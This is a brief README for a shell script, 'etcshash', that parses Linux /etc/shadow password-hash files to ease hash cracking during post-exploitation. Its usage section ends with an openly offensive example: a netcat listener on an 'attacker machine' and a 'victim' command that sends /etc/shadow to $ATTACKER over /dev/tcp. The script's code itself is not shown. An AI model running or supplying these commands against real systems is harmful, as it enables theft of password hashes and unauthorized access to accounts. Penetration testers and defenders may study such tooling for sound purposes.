# etcshash

> A shell script to parse the /etc/shadow file and automatically display the relevant information

This script aims to make post exploitation easier by parsing the `/etc/shadow` file and outputting the information in a concise way that makes steps like hash cracking easier

## Usage

Currently, the script only supports reading from stdin:
```sh
cat /etc/shadow | ./etcshash.sh
```
or output every field of the `/etc/shadow` file with the `-a` flag
```sh
cat /etc/shadow | ./etcshash.sh -a
```

as it reads from stdin it can also receive files sent e.g. from netcat:
```sh
# attacker machine:
nc -lvnp 1234 | ./etcshash.sh

# victim:
cat /etc/shadow > /dev/tcp/$ATTACKER/1234
```